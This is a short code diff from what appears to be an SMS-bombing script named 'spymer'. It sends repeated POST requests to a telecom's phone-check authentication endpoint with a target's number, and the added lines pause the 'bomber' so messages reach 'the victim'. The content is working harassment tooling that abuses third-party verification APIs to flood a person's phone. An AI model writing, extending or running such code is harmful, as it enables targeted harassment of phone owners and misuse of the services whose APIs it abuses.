@@ -147,6 +147,9 @@ class spymer:
 			beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
 			print("Beltelecom - sended!")
 			iteration += 1
+			print("We stopped bomber for 30 seconds. Wait...")
+			print("This is necessary to completely send messages to the victim.")
+			time.sleep(30)
 
 spammer = spymer()
 spammer.main()
